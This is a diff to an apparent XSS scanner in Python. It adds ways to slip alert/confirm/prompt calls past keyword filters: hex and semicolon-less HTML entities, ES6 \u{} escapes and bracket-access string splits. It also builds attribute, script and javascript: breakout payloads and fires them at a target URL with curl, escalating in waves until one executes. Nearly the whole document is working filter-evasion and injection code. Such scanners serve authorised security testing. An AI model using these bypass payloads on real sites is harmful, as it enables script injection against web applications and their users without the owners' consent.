@@ -108,7 +108,7 @@ def char_scores(results, refl_idx):
     for r in results:
         if r["reflection_index"] != refl_idx:
             continue
-        exp, got = r["expected"], r["got_back"]
+        exp, got = r["expected"], r["got_back"] or ""
         if r["passed"]:
             scores[exp] = 100
         elif exp in got:
@@ -207,6 +207,33 @@ def entity_fname(name):
     return name[:i] + f"&#{ord(name[i])};" + name[i + 1:]
 
 
+def entity_variants(name, kw):
+    """Alternative char-ref spellings for ONE letter: hex, padded
+    decimal, capital-X, and no-semicolon forms ('alert' -> 'al&#x65;rt',
+    'al&#0000101;rt', 'al&#X65;rt', 'al&#x65rt'). Same decode layer as
+    &#NNN; (the HTML parser — attribute values only) but different byte
+    patterns, so a filter that signs the canonical spelling misses them.
+    hex_ref gates the &#x/padded/X family; nosemi_ref gates the ';'-less
+    forms, which are emitted only when the next letter cannot extend
+    the reference ('&#x6c'+'e' would merge into one wrong char)."""
+    if not (kw.get("hex_ref", True) or kw.get("nosemi_ref", True)):
+        return None
+    i = secrets.randbelow(len(name))
+    cp = ord(name[i])
+    nxt = name[i + 1] if i + 1 < len(name) else ""
+    forms = []
+    if kw.get("hex_ref", True):
+        forms += [f"&#x{cp:x};", f"&#{cp:07d};", f"&#X{cp:X};"]
+    if kw.get("nosemi_ref", True):
+        if not nxt or not nxt.isdigit():
+            forms.append(f"&#{cp}")
+        if not nxt or not re.match(r"[0-9a-fA-F]", nxt):
+            forms.append(f"&#x{cp:x}")
+    if not forms:
+        return None
+    return name[:i] + secrets.choice(forms) + name[i + 1:]
+
+
 def encoded_funcs(kw):
     """Dialog-fn call strings with one letter entity-encoded, emitted
     ONLY for call forms whose plain version is blocked by the keyword
@@ -223,17 +250,28 @@ def encoded_funcs(kw):
     out = []
     for name in ("alert", "confirm", "prompt"):
         enc = entity_fname(name)
+        var = entity_variants(name, kw)
         if parens and (not kw.get(name, True)
                        or not kw.get(f"call_{name}", True)):
             out.append(f"{enc}(1)")
+            if var:
+                out.append(f"{var}(1)")
         if btick and (not kw.get(name, True)
                       or not kw.get(f"tick_{name}", True)):
             out.append(f"{enc}`1`")
+            if var:
+                out.append(f"{var}`1`")
     if parens and (not kw.get("print", True)
                    or not kw.get("call_print", True)):
         out.append(entity_fname("print") + "()")
+        pv = entity_variants("print", kw)
+        if pv:
+            out.append(pv + "()")
     if not parens and not btick and not kw.get("alert", True):
         out.append(f"onerror={entity_fname('alert')};throw 1")
+        av = entity_variants("alert", kw)
+        if av:
+            out.append(f"onerror={av};throw 1")
     return out
 
 
@@ -269,6 +307,132 @@ def u_funcs(kw):
         out.append(u_fname("print") + "()")
     if not parens and not btick and not kw.get("alert", True):
         out.append(f"onerror={u_fname('alert')};throw 1")
+    return out
+
+
+def u6_fname(name):
+    """Encode ONE random letter of a JS fn name as an ES6 brace-form
+    unicode escape ('alert' -> 'al\\u{65}rt'). Same decode layer as
+    \\u0065 (the JS engine — valid in identifiers AND string literals)
+    but the \\u{XX} shape is not matched by filters written for the
+    fixed 4-digit form, and the digit count inside the braces is
+    arbitrary ('\\u{0000000065}' is still 'a')."""
+    i = secrets.randbelow(len(name))
+    return name[:i] + f"\\u{{{ord(name[i]):x}}}" + name[i + 1:]
+
+
+def u6_funcs(kw):
+    """ES6 \\u{XX} call strings for dialog-fns whose plain form is
+    blocked (name or call_*/tick_* junction) — the brace-form sibling
+    of u_funcs. gen_u6brace probes whether the '{...}' escape shape
+    reaches the page at all: a filter can strip '{' while leaving a
+    bare \\u untouched."""
+    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
+    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
+    brace = kw.get("gen_u6brace", True)
+    out = []
+    for name in ("alert", "confirm", "prompt"):
+        enc = u6_fname(name)
+        if parens and brace and (not kw.get(name, True)
+                                 or not kw.get(f"call_{name}", True)):
+            out.append(f"{enc}(1)")
+        if btick and brace and (not kw.get(name, True)
+                                or not kw.get(f"tick_{name}", True)):
+            out.append(f"{enc}`1`")
+    if parens and brace and (not kw.get("print", True)
+                             or not kw.get("call_print", True)):
+        out.append(u6_fname("print") + "()")
+    if not parens and not btick and not kw.get("alert", True):
+        out.append(f"onerror={u6_fname('alert')};throw 1")
+    return out
+
+
+def bracket_funcs(kw, forbid_q=None):
+    """Global-object string-concat calls: self['a'+'lert'](1) et al.
+
+    Two roles: (a) the vehicle for string-only escapes ('\\x61',
+    '\\141', '\\u{61}') which can never appear in an identifier;
+    (b) the only name-bypass surviving when BOTH '\\' and '&' are
+    filtered — a pure 'a'+'lert' concat needs neither. Emitted ONLY
+    for names whose plain call form is blocked (the name itself or its
+    call_* junction): when alert(1) works there is nothing to bypass,
+    so no candidate is generated (saves verify steps). gen_bracket
+    controls the composite self['x'+'y']() shape; gen_call/gen_tick
+    still gate the call shapes. forbid_q drops the inner-quote variant
+    that would collide with the surrounding context (js_string
+    '-...-', attr_handler/url/srcdoc "...\"...")."""
+    if not kw.get("gen_bracket", True):
+        return []
+    parens = kw.get("parentheses", True) and kw.get("gen_call", True)
+    btick = kw.get("backtick", True) and kw.get("gen_tick", True)
+    quotes = [q for q in ("'", '"') if q != forbid_q] or ["'"]
+    objs = ("self", "window", "globalThis", "top", "frames")
+    per_name = []
+    for oi, name in enumerate(("alert", "confirm", "prompt", "print")):
+        if kw.get(name, True) and \
+                kw.get(f"call_{name}", kw.get("gen_call", True)):
+            continue
+        arg = "()" if name == "print" else "(1)"
+        obj = objs[oi % len(objs)]  # rotated alt-object for diversity
+        # unsplit/noop-escape/embed-literal forms carry the name verbatim:
+        # provably dead when the name atom itself is stripped (kw[name]=F),
+        # so they are pruned instead of wasting verify steps on corpses.
+        name_ok = kw.get(name, True)
+        # every split position: 'a'+'lert' .. 'aler'+'t' — deterministic
+        # coverage of anything a random splitter could emit
+        splits = [(name[:k], name[k:]) for k in range(1, len(name))]
+        cp = ord(name[0])
+        v = []
+        if parens:
+            for q in quotes:
+                if name_ok:
+                    v.append(f"self[{q}{name}{q}]{arg}")
+                    # single-string escapes: the JS engine decodes these
+                    # INSIDE the string literal — the request carries
+                    # neither the fn name nor a concat shape. '\a' is a
+                    # noop-escape: backslash before a non-escape letter
+                    # is ignored -> 'a' (NZT-48 invalid-escape vector).
+                    v.append(f"self[{q}\\{name[0]}{name[1:]}{q}]{arg}")
+                v.append(f"self[{q}\\x{cp:02x}{name[1:]}{q}]{arg}")
+                v.append(f"self[{q}\\{cp:03o}{name[1:]}{q}]{arg}")
+                v.append(f"self[{q}\\u{{{cp:x}}}{name[1:]}{q}]{arg}")
+                for fst, rst in splits:
+                    v.append(f"self[{q}{fst}{q}+{q}{rst}{q}]{arg}")
+            if obj != "self":
+                q = quotes[0]
+                if name_ok:
+                    v.append(f"{obj}[{q}{name}{q}]{arg}")
+                v.append(f"{obj}[{q}\\x{cp:02x}{name[1:]}{q}]{arg}")
+                for fst, rst in splits[:2]:
+                    v.append(f"{obj}[{q}{fst}{q}+{q}{rst}{q}]{arg}")
+            q, (fst, rst) = quotes[0], splits[0]
+            v.append(f"{obj}[{q}\\x{cp:02x}{q}+{q}{rst}{q}]{arg}")
+            v.append(f"{obj}[{q}\\{cp:03o}{q}+{q}{rst}{q}]{arg}")
+            v.append(f"{obj}[{q}\\u{{{cp:x}}}{q}+{q}{rst}{q}]{arg}")
+        elif btick:
+            for q in quotes:
+                if name_ok:
+                    v.append(f"self[{q}{name}{q}]`1`")
+                v.append(f"self[{q}\\x{cp:02x}{name[1:]}{q}]`1`")
+                for fst, rst in splits:
+                    v.append(f"self[{q}{fst}{q}+{q}{rst}{q}]`1`")
+        else:
+            q, (fst, rst) = quotes[0], splits[0]
+            if name_ok:
+                v.append(f"onerror=self[{q}{name}{q}];throw 1")
+            v.append(f"onerror=self[{q}\\x{cp:02x}{name[1:]}{q}]"
+                     f";throw 1")
+            v.append(f"onerror={obj}[{q}{fst}{q}+{q}{rst}{q}]"
+                     f";throw 1")
+        per_name.append(v)
+    # Round-robin across fn names: a growing fn_cap samples every family
+    # evenly (each name's simplest forms first) instead of exhausting one
+    # family's variants before the next name is ever reached.
+    out = []
+    for i in range(max((len(v) for v in per_name), default=0)):
+        for v in per_name:
+            if i < len(v):
+                out.append(v[i])
     return out
 
 
@@ -324,7 +488,7 @@ INERT_SCRIPT_SINKS = ("innerhtml", "outerhtml", "insertadjacenthtml",
                       "createcontextualfragment")
 
 
-def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
+def compose(ctx, quote, scores, kw=None, kwv=None, inert=False, fn_cap=2):
     """Assemble candidate payloads from grammar primitives.
     kw: keyword mask {name: bool} from the probe2 analysis (Layer B/C gate).
     kwv: {name: (expected, got_back)} — the actual probed strings, needed to
@@ -334,12 +498,28 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
     kw = kw or {}
     kwv = kwv or {}
     funcs = avail_funcs(kw)
+    # Contexts where a fn lands INSIDE a live quote — a bracket-concat
+    # using the same quote char would terminate it early ('-...-' in a
+    # '...' JS string, on*="..." handler/url/srcdoc values). Bracket
+    # fns there must build their strings with the OTHER quote.
+    INNER_Q_CTXS = ("attr_handler", "attr_url", "attr_srcdoc",
+                    "js_string")
+    forbid_q = quote if (ctx in INNER_Q_CTXS
+                         and quote in ("'", '"')) else None
     # hfuncs — event-handler attribute values (on*="..."): both HTML
     # char refs (&#NNN;) and JS unicode escapes (NNNN) decode there.
-    hfuncs = funcs + encoded_funcs(kw) + u_funcs(kw)
     # jfuncs — JS-source positions (<script> bodies, js_* contexts,
     # javascript: URIs): only \u escapes decode; &#NNN; stays literal.
-    jfuncs = funcs + u_funcs(kw)
+    # Both lists are pre-filtered through required_ok: an fn needing a
+    # probe char that scored <100 can never survive add()'s gate anyway,
+    # and leaving it in place would waste hfuncs[:fn_cap]/[0] slots on dead
+    # variants (e.g. aler\u0074(1) when '\' is escaped -> '\\').
+    hfuncs = [f for f in (funcs + encoded_funcs(kw) + u_funcs(kw)
+                          + u6_funcs(kw) + bracket_funcs(kw, forbid_q))
+              if required_ok(f, scores)]
+    jfuncs = [f for f in (funcs + u_funcs(kw) + u6_funcs(kw)
+                          + bracket_funcs(kw, forbid_q))
+              if required_ok(f, scores)]
     out = []
     marker = "vvm{id}"
 
@@ -349,6 +529,8 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
                 technique += " (entity-encoded fn)"
             if "\\u" in payload:
                 technique += " (unicode-escaped fn)"
+            if "['" in payload or '["' in payload:
+                technique += " (bracket-access fn)"
             out.append({
                 "payload": payload,
                 "technique": technique,
@@ -410,17 +592,17 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
                                 "script injection", "body_direct")
                 else:
                     if kw.get("case_script", True):
-                        for fn in jfuncs[:2] or (rebuild_fn(rsplit[0]) if rsplit else []):
+                        for fn in jfuncs[:fn_cap] or (rebuild_fn(rsplit[0]) if rsplit else []):
                             add(f"<ScRiPt {marker}>{fn}</ScRiPt>",
                                 "case-mutated script tag", "tag_removed")
                     for s in rsplit[:3]:
-                        for fn in jfuncs[:2] or rebuild_fn(s):
+                        for fn in jfuncs[:fn_cap] or rebuild_fn(s):
                             add(f"{split_str('<script>', s)} {marker}>{fn}"
                                 f"{split_str('</script>', s)}",
                                 f"nested tag-strip bypass ({s} splitter)", "tag_removed")
             for tag, ev, extra, deps in TAG_HANDLERS:
                 if all(kw.get(d, True) for d in deps):
-                    for fn in hfuncs[:2]:
+                    for fn in hfuncs[:fn_cap]:
                         if shape_ok(GEN_EV.get(ev), fn):
                             add(f"<{tag} {extra} {marker} {ev}={fn}>"
                                 .replace("  ", " "),
@@ -439,7 +621,7 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
                             for d in deps if not d.startswith("pair_"))
                         tag_atom = fix(tag + "_tag", "<" + tag, s) \
                             if atom_blocked else split_str("<" + tag, s)
-                        for fn0 in hfuncs[:1] or rebuild_fn(s):
+                        for fn0 in hfuncs[:fn_cap] or rebuild_fn(s):
                             if "=" in fn0:
                                 # in-attribute fallback already carries
                                 # 'onerror=' — emit it bare, tag split only
@@ -454,22 +636,24 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
                                 .replace("  ", " "),
                                 f"removed-string splitter ({s})", "tag_removed")
             if kw.get("javascript_proto", True) and \
-                    kw.get("proto_href", True) and jfuncs and \
-                    shape_ok("gen_jsurl", jfuncs[0]):
-                add(f'<a {marker} href="javascript:{jfuncs[0]}">XSS</a>',
-                    "javascript: protocol href", "protocol")
-            if not kw.get("javascript_proto", True) and kw.get("case_proto", True) \
-                    and jfuncs:
-                add(f'<a {marker} href="JaVaScRiPt:{jfuncs[0]}">XSS</a>',
-                    "case-mutated javascript: href", "protocol")
-            jfns = jfuncs[:1] or (rebuild_fn(rsplit[0]) if rsplit else [])
+                    kw.get("proto_href", True):
+                for fn in jfuncs[:fn_cap]:
+                    if shape_ok("gen_jsurl", fn):
+                        add(f'<a {marker} href="javascript:{fn}">XSS</a>',
+                            "javascript: protocol href", "protocol")
+            if not kw.get("javascript_proto", True) and kw.get("case_proto", True):
+                for fn in jfuncs[:fn_cap]:
+                    add(f'<a {marker} href="JaVaScRiPt:{fn}">XSS</a>',
+                        "case-mutated javascript: href", "protocol")
+            jfns = jfuncs[:fn_cap] or (rebuild_fn(rsplit[0]) if rsplit else [])
             if not kw.get("javascript_proto", True) and rsplit and jfns:
-                add(f'<a {marker} href="{split_str("javascript:", rsplit[0])}'
-                    f'{jfns[0]}">XSS</a>',
-                    f"removed-string splitter ({rsplit[0]})", "tag_removed")
+                for jfn in jfns:
+                    add(f'<a {marker} href="{split_str("javascript:", rsplit[0])}'
+                        f'{jfn}">XSS</a>',
+                        f"removed-string splitter ({rsplit[0]})", "tag_removed")
             if kw.get("svg_tag", True) and not kw.get("onload", True) \
                     and kw.get("case_onload", True):
-                for fn in hfuncs[:2]:
+                for fn in hfuncs[:fn_cap]:
                     add(f"<svg {marker} OnLoAd={fn}>",
                         "case-mutated onload handler", "body_direct")
             # last-resort: entity-encoded inner HTML inside iframe srcdoc.
@@ -499,7 +683,7 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
                 others = [d for d in deps if d != deps[0]]
                 if name_ok(deps[0]) and \
                         all(kw.get(d, True) for d in others):
-                    for fn in hfuncs[:2]:
+                    for fn in hfuncs[:fn_cap]:
                         add(f"<{tag} {extra} {marker} {ev}={fn}//"
                             .replace("  ", " "),
                             f"no greater-than ({tag} {ev})", "gt_missing")
@@ -507,27 +691,30 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
     elif ctx == "attr":
         if tags_ok and q_ok and quote:
             for tag, ev, extra in handler_variants():
-                for fn in hfuncs[:2]:
+                for fn in hfuncs[:fn_cap]:
                     if shape_ok(GEN_EV.get(ev), fn):
                         add(f'{quote}><{tag} {extra} {marker} {ev}={fn}>'
                             .replace("  ", " "),
                             "attribute breakout -> tag", "breakout_tag")
-            if script_ok and jfuncs and shape_ok("gen_script", jfuncs[0]):
-                add(f'{quote}><script {marker}>{jfuncs[0]}</script>',
-                    "attribute breakout -> script", "breakout_tag")
+            if script_ok and jfuncs:
+                for fn in jfuncs[:fn_cap]:
+                    if shape_ok("gen_script", fn):
+                        add(f'{quote}><script {marker}>{fn}</script>',
+                            "attribute breakout -> script", "breakout_tag")
         elif q_ok:
             sep = quote if quote else " "
             if hfuncs and kw.get("autofocus", True) and kw.get("onfocus", True):
-                add(f'{sep} autofocus onfocus={sep}{hfuncs[0]}' if quote else
-                    f' autofocus onfocus={hfuncs[0]} accesskey=x',
-                    "in-context attribute injection", "attr_inject")
+                for fn in hfuncs[:fn_cap]:
+                    add(f'{sep} autofocus onfocus={sep}{fn}' if quote else
+                        f' autofocus onfocus={fn} accesskey=x',
+                        "in-context attribute injection", "attr_inject")
 
     elif ctx == "attr_handler":
         # input already inside an existing on*="" handler — zero-breaker JS
         for fn in hfuncs:
             add(f'{fn}/*{marker}*/', "in-handler direct call", "attr_inject")
         if quote and q_ok:
-            for fn in hfuncs[:2]:
+            for fn in hfuncs[:fn_cap]:
                 add(f'{quote});{fn}/*{marker}*/;//',
                     "handler close-call breakout", "breakout_tag")
 
@@ -537,7 +724,7 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
         # javascript: needs href= + a click and is dead in src=/data=.
         if tags_ok and q_ok and quote:
             for tag, ev, extra in handler_variants():
-                for fn in hfuncs[:2]:
+                for fn in hfuncs[:fn_cap]:
                     if shape_ok(GEN_EV.get(ev), fn):
                         add(f'{quote}><{tag} {extra} {marker} {ev}={fn}>'
                             .replace("  ", " "),
@@ -557,7 +744,7 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
     elif ctx == "js_raw":
         for fn in jfuncs:
             add(f'{fn}/*{marker}*/', "raw JS direct call", "js_string_exec")
-        for fn in jfuncs[:2]:
+        for fn in jfuncs[:fn_cap]:
             add(f');{fn}/*{marker}*/;//', "raw JS close-call", "js_string_exec")
 
     elif ctx == "js_template":
@@ -566,7 +753,7 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
                 add(f'${{{fn}}}/*{marker}*/', "template-literal interpolation",
                     "js_string_exec")
         if quote == "`" and q_ok:
-            for fn in jfuncs[:2]:
+            for fn in jfuncs[:fn_cap]:
                 add(f'`+{fn}+`/*{marker}*/', "literal concat breakout", "js_string_exec")
 
     elif ctx == "js_lcomment":
@@ -581,7 +768,7 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
 
     elif ctx == "js_string":
         if tags_ok and slash_ok and script_ok and kw.get("close_script", True):
-            for fn in jfuncs[:2]:
+            for fn in jfuncs[:fn_cap]:
                 if shape_ok("gen_script", fn):
                     add(f"</script><script {marker}>{fn}</script>//",
                         "script tag breakout", "js_breakout")
@@ -612,21 +799,26 @@ def compose(ctx, quote, scores, kw=None, kwv=None, inert=False):
     elif ctx.startswith("consuming:"):
         tag = ctx.split(":", 1)[1]
         if tags_ok and slash_ok and kw.get(f"close_{tag}", True):
-            if script_ok and jfuncs and shape_ok("gen_script", jfuncs[0]):
-                add(f"</{tag}><script {marker}>{jfuncs[0]}</script>",
-                    f"{tag} close + script", "tag_breakout")
-            if kw.get("img_tag", True) and kw.get("onerror", True) and hfuncs \
-                    and shape_ok("gen_h_error", hfuncs[0]):
-                add(f'</{tag}><img src=x {marker} onerror={hfuncs[0]}>',
-                    f"{tag} close + img onerror", "tag_breakout")
-                add(f'<{tag}><img title="{marker}</{tag}><img src onerror={hfuncs[0]}>"></{tag}>',
-                    f"{tag} consuming-tag trick", "comment_break")
+            if script_ok and jfuncs:
+                for fn in jfuncs[:fn_cap]:
+                    if shape_ok("gen_script", fn):
+                        add(f"</{tag}><script {marker}>{fn}</script>",
+                            f"{tag} close + script", "tag_breakout")
+            if kw.get("img_tag", True) and kw.get("onerror", True) and hfuncs:
+                for fn in hfuncs[:fn_cap]:
+                    if shape_ok("gen_h_error", fn):
+                        add(f'</{tag}><img src=x {marker} onerror={fn}>',
+                            f"{tag} close + img onerror", "tag_breakout")
+                        add(f'<{tag}><img title="{marker}</{tag}><img src onerror={fn}>"></{tag}>',
+                            f"{tag} consuming-tag trick", "comment_break")
 
     elif ctx == "comment":
         if tags_ok and hfuncs and kw.get("svg_tag", True) \
-                and kw.get("onload", True) and kw.get("pair_svg_onload", True) \
-                and shape_ok("gen_handler", hfuncs[0]):
-            add(f"--><svg {marker} onload={hfuncs[0]}>", "comment breakout", "comment_break")
+                and kw.get("onload", True) and kw.get("pair_svg_onload", True):
+            for fn in hfuncs[:fn_cap]:
+                if shape_ok("gen_handler", fn):
+                    add(f"--><svg {marker} onload={fn}>", "comment breakout",
+                        "comment_break")
 
     return out
 
@@ -648,21 +840,28 @@ class MarkerDomCheck(HTMLParser):
         self.executable = False
         self.evidence = ""
         self._in_script = False
+        self._script_buf = None
+        self.script_hits = []   # script bodies containing the needle
+        self.attr_hits = []     # (tag, attr, value) executable attrs seen
+        self.url_hits = []      # (tag, attr, value) javascript:/data: URLs
 
     def handle_starttag(self, tag, attrs):
         d = dict(attrs)
         if tag == "script":
             self._in_script = True
+            self._script_buf = ""
         joined = " ".join(str(v or "") for v in d.values())
         if self.marker not in joined and self.marker not in "".join(d.keys()):
             return
         for k, v in d.items():
             if k.startswith("on"):
                 self.executable = True
+                self.attr_hits.append((tag, k, v or ""))
                 self.evidence = f"<{tag}> marker element carries event handler {k}"
             if k in ("href", "src", "action", "formaction") and v and \
                     re.match(r"\s*(javascript:|data:text|vbscript:)", v, re.I):
                 self.executable = True
+                self.url_hits.append((tag, k, v))
                 self.evidence = f"<{tag}> marker element has executable {k} URL"
             if k == "srcdoc" and v and re.search(r"(on\w+=|<script|&lt;script|onerror)",
                                                  v, re.I):
@@ -674,12 +873,158 @@ class MarkerDomCheck(HTMLParser):
 
     def handle_endtag(self, tag):
         if tag == "script":
+            if self._script_buf and self.marker in self._script_buf:
+                self.script_hits.append(self._script_buf)
             self._in_script = False
+            self._script_buf = None
 
     def handle_data(self, data):
-        if self._in_script and not self.script_inert and self.marker in data:
-            self.executable = True
-            self.evidence = "marker inside <script> body"
+        if self._in_script:
+            if self._script_buf is not None:
+                self._script_buf += data
+            if not self.script_inert and self.marker in data:
+                self.executable = True
+                self.evidence = "marker inside <script> body"
+
+
+def _core_payload(marked, marker):
+    """The sent payload minus the marker: strip a <!--marker--> tail and any
+    in-payload marker, leaving the executable text we actually injected."""
+    core = marked.replace(f"<!--{marker}-->", "")
+    return core.replace(marker, "")
+
+
+def _parse_response(raw):
+    """Split curl -i output into (status, headers, body). Handles stacked
+    header blocks (100-continue, redirects)."""
+    status = 0
+    headers = {}
+    while raw.startswith("HTTP/"):
+        _, _, rest = raw.partition("\n")
+        m = re.match(r"HTTP/\S+\s+(\d+)", raw)
+        if m:
+            status = int(m.group(1))
+        head, sep, body = rest.partition("\r\n\r\n")
+        if not sep:
+            head, sep, body = rest.partition("\n\n")
+        if not sep:
+            break
+        for hl in head.splitlines():
+            k, _, v = hl.partition(":")
+            if k.strip():
+                headers[k.strip().lower()] = v.strip()
+        raw = body
+    return status, headers, raw
+
+
+def _locate_anchor(body, marker, marked):
+    """Find what actually reflected: marker first, then core fallbacks
+    (verbatim -> html-escaped -> url-encoded). Returns (needle, style)."""
+    if marker in body:
+        return marker, "marker"
+    core = _core_payload(marked, marker)
+    from html import escape as _he
+    for variant, style in ((core, "core"),
+                           (_he(core), "core html-encoded"),
+                           (quote(core, safe=""), "core url-encoded")):
+        if variant and variant in body:
+            return variant, style
+    return None, ""
+
+
+def classify_response(status, headers, body, payload, marker):
+    """Grade one fetched response. Flow:
+      blocked? -> marker/core anchor? -> executable position? -> JS ctx:
+      surviving call inside payload span? -> V / V-truncated / R / none.
+    Pure function over (status, headers, body) so every branch is testable."""
+    marked = payload.replace("vvm{id}", marker)
+    if "vvm" not in marked:
+        marked += f"<!--{marker}-->"
+    core = _core_payload(marked, marker)
+    csp = headers.get("content-security-policy", "")
+    csp_note = ""
+    if csp and re.search(r"(?:script-src|default-src)", csp) \
+            and "unsafe-inline" not in csp:
+        csp_note = " | CSP: script-src lacks 'unsafe-inline' — inline payload likely blocked"
+
+    needle, style = _locate_anchor(body, marker, marked)
+    if needle is None:
+        if status >= 400:
+            return {"payload": marked, "confidence": "blocked",
+                    "evidence": f"HTTP {status} — request rejected before reflection"}
+        return {"payload": marked, "confidence": "none",
+                "evidence": "payload not reflected"
+                            + (f" (HTTP {status})" if status else "")}
+
+    chk = MarkerDomCheck(needle)
+    chk.feed(body)
+    if not chk.executable:
+        ev = (f"marker stripped but {style} reflected, not in executable position"
+              if style != "marker" else
+              "marker reflected but not in executable position")
+        return {"payload": marked, "confidence": "R", "evidence": ev}
+
+    # JS contexts: marker-in-<script>-body — require a surviving call in the
+    # payload span (Dalfox payload_range_hits_sink port). A marker inside a
+    # script whose call was stripped (""-(1)-"") is dead code, not a finding.
+    if chk.script_hits:
+        import js_verify
+        needles = [marked, core] if style == "marker" else [needle]
+        mk = marker if style == "marker" else None
+        for script_text in chk.script_hits:
+            for nd in needles:
+                live, det = js_verify.payload_live_in_js(script_text, nd, mk)
+                if live:
+                    ev = chk.evidence + " — " + det
+                    return {"payload": marked, "confidence": "V",
+                            "evidence": ev + csp_note}
+        return {"payload": marked, "confidence": "R",
+                "evidence": "marker in <script> but no surviving call — "
+                            "executable core stripped or trapped"}
+
+    # on* handlers: entity-decode the value the way the browser will, then
+    # check the intended JS fragment produced a call
+    if chk.attr_hits:
+        import js_verify
+        from html import unescape
+        intended = js_verify.extract_intended_js(core)
+        needles = [intended] + ([unescape(intended)]
+                               if unescape(intended) != intended else [])
+        for _tag, _attr, val in chk.attr_hits:
+            uv = unescape(val)
+            for nd in needles:
+                live, det = js_verify.payload_live_in_js(uv, nd)
+                if live:
+                    return {"payload": marked, "confidence": "V",
+                            "evidence": chk.evidence + " — " + det + csp_note}
+        return {"payload": marked, "confidence": "R",
+                "evidence": "marker element has on* handler but injected JS "
+                            "did not survive"}
+
+    # javascript:/data: URLs — check the scheme body for a surviving call
+    if chk.url_hits:
+        import js_verify
+        from html import unescape
+        intended = js_verify.extract_intended_js(core)
+        needles = [intended] + ([unescape(intended)]
+                               if unescape(intended) != intended else [])
+        for _tag, _attr, val in chk.url_hits:
+            uv = unescape(val)
+            body_js = re.sub(r"^\s*(?:javascript|data:text/html[^,]*,)\s*",
+                             "", uv, flags=re.I)
+            for nd in needles:
+                live, det = js_verify.payload_live_in_js(body_js, nd)
+                if live:
+                    break
+            if live:
+                return {"payload": marked, "confidence": "V",
+                        "evidence": chk.evidence + " — " + det +
+                        " (requires click if href)" + csp_note}
+        return {"payload": marked, "confidence": "R",
+                "evidence": "executable URL attr but injected JS did not survive"}
+
+    return {"payload": marked, "confidence": "V",
+            "evidence": chk.evidence + csp_note}
 
 
 def verify_payload(url, payload, render=False):
@@ -706,33 +1051,32 @@ def verify_payload(url, payload, render=False):
             return {"payload": marked, "confidence": "V",
                     "evidence": "executed: " + "; ".join(fired[:3])}
         if marker not in body and not sink_hits:
+            core = _core_payload(marked, marker)
+            if core in body:
+                return {"payload": marked, "confidence": "R",
+                        "evidence": "marker stripped but core payload reflected "
+                                    "— did not execute"}
             return {"payload": marked, "confidence": "none",
                     "evidence": "payload not reflected (rendered DOM)"}
         chk = MarkerDomCheck(marker, script_inert=True)
         chk.feed(body)
         if chk.executable:
-            return {"payload": marked, "confidence": "V",
-                    "evidence": chk.evidence}
+            return {"payload": marked, "confidence": "R",
+                    "evidence": chk.evidence + " — position only, did not fire"}
         ev = ("marker reached sink: " + ", ".join(sorted(set(sink_hits)))
               if sink_hits else "marker reflected but not in executable position")
         return {"payload": marked, "confidence": "R", "evidence": ev}
 
     try:
-        body = subprocess.run(
-            ["curl", "-s", "-k", "--max-time", "15", "-A",
+        raw = subprocess.run(
+            ["curl", "-s", "-k", "-i", "--max-time", "15", "-A",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", target],
             capture_output=True, text=True, timeout=20).stdout
     except Exception as e:
         return {"payload": marked, "confidence": "error", "evidence": str(e)}
-    if marker not in body:
-        return {"payload": marked, "confidence": "none",
-                "evidence": "payload not reflected"}
-    chk = MarkerDomCheck(marker)
-    chk.feed(body)
-    grade = "V" if chk.executable else "R"
-    return {"payload": marked, "confidence": grade,
-            "evidence": chk.evidence or "marker reflected but not in executable position"}
+    status, headers, body = _parse_response(raw)
+    return classify_response(status, headers, body, payload, marker)
 
 
 # --- main --------------------------------------------------------------------
@@ -816,7 +1160,8 @@ def main():
             if "splitter" in t or "bypass" in t:
                 return 1
             if c["case_ref"] == "tag_removed" or "case-mutated" in t \
-                    or "entity" in t or "unicode-escaped" in t:
+                    or "entity" in t or "unicode-escaped" in t \
+                    or "bracket-access" in t:
                 return 2
             return 0
         cand.sort(key=lambda c: (-c["efficiency"], tier(c)))
@@ -845,8 +1190,33 @@ def main():
             else:
                 render = args.render or analysis.get("probe_mode") == "render"
                 print(f"    verifying top payloads{render and ' (rendered DOM)' or ''}...")
-                verified = [verify_payload(args.url, c["payload"], render=render)
-                            for c in cand]
+                # Verify waves: start shallow (fn_cap=2, matching the emitted
+                # list). When every candidate fails, re-compose with a deeper
+                # fn slice and verify the next unseen batch — deeper bracket
+                # splits and name variants — instead of stopping at the first
+                # dead signatures.
+                seen, verified = set(), []
+                cap, wave = 2, cand
+                while wave:
+                    found = False
+                    for c in wave:
+                        if c["payload"] in seen:
+                            continue
+                        seen.add(c["payload"])
+                        v = verify_payload(args.url, c["payload"], render=render)
+                        verified.append(v)
+                        if v["confidence"] == "V":
+                            found = True
+                            if cap > 2:
+                                break      # expansion wave: first hit suffices
+                    if found or cap >= 16:
+                        break
+                    cap *= 2
+                    more = compose(ctx, quote_ch, scores, kw, kwv, inert,
+                                   fn_cap=cap)
+                    more.sort(key=lambda c: (-c["efficiency"], tier(c)))
+                    wave = [c for c in more
+                            if c["payload"] not in seen][:args.top]
                 entry["verification"] = verified
                 for v in verified:
                     print(f"        [{v['confidence']}] {v['payload']}")
